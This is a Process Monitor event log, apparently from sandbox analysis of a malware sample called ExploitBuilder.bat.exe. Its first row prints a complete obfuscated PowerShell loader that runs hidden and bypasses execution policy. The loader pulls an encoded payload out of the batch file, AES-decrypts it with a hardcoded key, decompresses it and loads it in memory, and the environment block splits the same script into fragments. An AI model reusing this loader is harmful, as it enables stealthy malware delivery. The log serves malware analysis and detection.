"Time of Day","Process Name","PID","Operation","Path","Result","Detail"
"8:46:26.1826084 AM","ExploitBuilder.bat.exe","3688","Process Start","","SUCCESS","Parent PID: 1280, Command line: ""ExploitBuilder.bat.exe""  -noprofile -windowstyle hidden -ep bypass -command $eaqcw = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\vagrant\Desktop\boomboom\ExploitBuilder.bat').Split([Environment]::NewLine);foreach ($VtoBl in $eaqcw) { if ($VtoBl.StartsWith(':: ')) {  $BMjJe = $VtoBl.Substring(3); break; }; };$VGGCQ = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($BMjJe);$hbvqO = New-Object System.Security.Cryptography.AesManaged;$hbvqO.Mode = [System.Security.Cryptography.CipherMode]::CBC;$hbvqO.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$hbvqO.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=');$hbvqO.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('E55hmIoW8UIQx1ajzTvfAA==');$CfOAS = $hbvqO.CreateDecryptor();$VGGCQ = $CfOAS.TransformFinalBlock($VGGCQ, 0, $VGGCQ.Length);$CfOAS.Dispose();$hbvqO.Dispose();$YVjlv = New-Object System.IO.MemoryStream(, $VGGCQ);$iJFSw = New-Object System.IO.MemoryStream;$uwkaq = New-Object System.IO.Compression.GZipStream($YVjlv, [IO.Compression.CompressionMode]::Decompress);$uwkaq.CopyTo($iJFSw);$uwkaq.Dispose();$YVjlv.Dispose();$iJFSw.Dispose();$VGGCQ = $iJFSw.ToArray();$WtHIs = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($VGGCQ);$iFZWS = $WtHIs.EntryPoint;$iFZWS.Invoke($null, (, [string[]] ('C:\Users\vagrant\Desktop\boomboom'))), Current directory: C:\Users\vagrant\Desktop\boomboom\, Environment: ;	=C:=C:\Users\vagrant\Desktop\boomboom;	=ExitCode=00000000;	AaqVUJsFhc=le -;	AaSnbDWVNC='C:\Users\vagrant\Desktop\boomboom\ExploitBuilder.bat';	ABhSbrTgER=0\;	abXWCidkkf=tion;	aCkWUTDwPk=VGGC;	AEGfPCrqyO=ose(;	aeYBWrDapi=flec;	afjOzRjDnI=, $V;	AGhPrBoWKq=[Env;	aGJlSTmIGr=ach ;	AiKHpVuHKm=5hmI;	aJsZZKACuq=s.En;	akYMOsYnBg=ll;	AlJuqVPqiH=he;	ALLUSERSPROFILE=C:\ProgramData;	AmwyQLBXEf=Disp;	aofwGrYKuk=.Dis;	aokxLffLvH=$iJF;	APPDATA=C:\Users\vagrant\AppData\Roaming;	aqEygMCsht=stem;	ATPSKtJvTi=jlv.;	AVRwaCHxXU=en -;	AVXNOWCrYy=onve;	AzaeVLnSKm=tem.;	bAmPlzaFrS=y ;	BEUzRjjltF=);	bhSpiBQTgK=[]] ;	BJwIuQohOC=esaB;	bKVwefFpfQ=ntLi;	bLSkxzIocm=em;	BmWAAtoZtA=16] ;	BRPfxdubya=ew-O;	bUGEgUQYXJ=m.IO;	BWGXyurnmg=\v;	bWuTzORYXG=y/0e;	byKscheqza=Wi;	CBDAOBTbyT=BC;$;	cEanUwXIQf=if n;	CEnbLsFZSW=s\;	CflouPSIiw=ment;	CgjLTCAhEv=oin ;	CjhfiUztjJ=ileP;	CJPfaXxzJf=prof;	cKMZbqsBMw=ptor;	cKvGHTjDvb=ert];	CKviuLofrZ= = [;	cljFYzXQJX=st 'C:\Windows\system32;	cMTCEkLKSS=] -j;	cMWZwvyPjN=;$Wt;	CommonProgramFiles=C:\Program Files\Common Files;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files;	CommonProgramW6432=C:\Program Files\Common Files;	COMPUTERNAME=TEST-WIN;	ComSpec=C:\Windows\system32\cmd.exe;	CpbqGCWJyV=Sw);;	CPCBmZCrbB=ll;	cPevnUWtSS= New;	CtfEtfqbKZ=CQ);;	cYlaqThezL=ct S;	cYlGmAGehm=m.IO;	czFmiBKjRi=-joi;	dAXIMoUSbi=ion.;	DAysEPJMyz=-Obj;	dhErvhUcWt=pher;	dJmyrtUeqc=ypto;	DluwAwkRVl=pose;	dLXChMDheV=ionM;	dmwwglsEzU=w = ;	dmZgVbtblN=WtHI;	doFipcMbJK=)($B;	dpPDluddlQ=IQx1;	DpXgcFEpEf=rity;	DRQxQsDOCj=OAS ;	DrxExOTxWf=bvqO;	DSZmMyFEsf=$CfO;	DvvURCtIoF=ode];	DXkpYciLMH=1..-;	DZAtvAAPfh=AS.T;	eaMQOeTuky=grap;	egGOGJBDLg=[Sys;	egKnzEtMZI= /;	egRYBGozVX=eam(;	eicofqiouq=omma;	EIInafGGUu=y.Cr;	ePcoAupSbC=bvqO;	etQcZuKmyN==');;	eVpNFQBQDl=nd;	eZLqvcziaM=gume;	FcWRXTvQjv=GGCQ;	FDyEkPUkrz=)) {;	FFubWFHHwC=iron;	FGLLskrNAo=HIs ;	fhUreVqiuD=we;	FIfzngtwnr= '');	fIzceWuXKM=s & ;	fKiWJovwSn== [S;	FnOmSPrnVA=;$Cf;	fPpNQjSMFw=.-11;	fSULLwiEcv=pose;	FtdLQlshwV===');	fvuHoEUOnP=]::C;	fxAMcxnHqd=yste;	GbWAhixrGF=VGGC;	GcnempLkRh=e]::;	gCZhHGPpYj=S46e;	GEjfgYPPBb=.Cry;	GKUDRMEpaS=st;	goPbqCDqmt=[Sys;	GPQNFBjqgi=cd /;	gQBxzrLgMn=tem.;	GqROtqxuqI=ke($;	GurPRNFWbo=PKCS;	gvHRRsHTEc=rS;	gwIgwSeaBE=ws;	gySOngycEi=embl;	GZJDreBRax='wYP;	hBggSuTAct=em.C;	HBzagEsWLP=MjJe;	hcnXVafHGf=sion;	HEFmnVtMIe=ateD;	HepXLrKnvX=' -V;	hERqKpkJoh=brea;	hLkMSkxvSy=;$YV;	hmbEshvCUg=('C:\Users\vagrant\Desktop\boomboom';	HNYmvxNiUB=raph;	HOMEDRIVE=C:;	HOMEPATH="
"8:46:26.1826251 AM","ExploitBuilder.bat.exe","3688","Thread Create","","SUCCESS","Thread ID: 2152"
"8:46:26.1880362 AM","ExploitBuilder.bat.exe","3688","Load Image","C:\Users\vagrant\Desktop\boomboom\ExploitBuilder.bat.exe","SUCCESS","Image Base: 0x7ff6a3360000, Image Size: 0x70000"
"8:46:26.1881113 AM","ExploitBuilder.bat.exe","3688","Load Image","C:\Windows\System32\ntdll.dll","SUCCESS","Image Base: 0x7ffa017f0000, Image Size: 0x1d1000"
"8:46:26.1883107 AM","ExploitBuilder.bat.exe","3688","RegOpenKey","HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Segment Heap","REPARSE","Desired Access: Query Value"
"8:46:26.1883409 AM","ExploitBuilder.bat.exe","3688","RegOpenKey","HKLM\System\CurrentControlSet\Control\Session Manager\Segment Heap","NAME NOT FOUND","Desired Access: Query Value"
"8:46:26.1888816 AM","ExploitBuilder.bat.exe","3688","CreateFile","C:\Users\vagrant\Desktop\boomboom","SUCCESS","Desired Access: Execute/Traverse, Synchronize, Disposition: Open, Options: Directory, Synchronous IO Non-Alert, Attributes: n/a, ShareMode: Read, Write, AllocationSize: n/a, OpenResult: Opened"
"8:46:26.1890900 AM","ExploitBuilder.bat.exe","3688","Load Image","C:\Windows\System32\kernel32.dll","SUCCESS","Image Base: 0x7ff9feeb0000, Image Size: 0xab000"
"8:46:26.1892864 AM","ExploitBuilder.bat.exe","3688","Load Image","C:\Windows\System32\KernelBase.dll","SUCCESS","Image Base: 0x7ff9fdfb0000, Image Size: 0x21d000"
"8:46:26.1905384 AM","ExploitBuilder.bat.exe","3688","RegQueryValue","HKLM\System\CurrentControlSet\Control\WMI\Security\05f95efe-7f75-49c7-a994-60a55cc09571","NAME NOT FOUND","Length: 524"
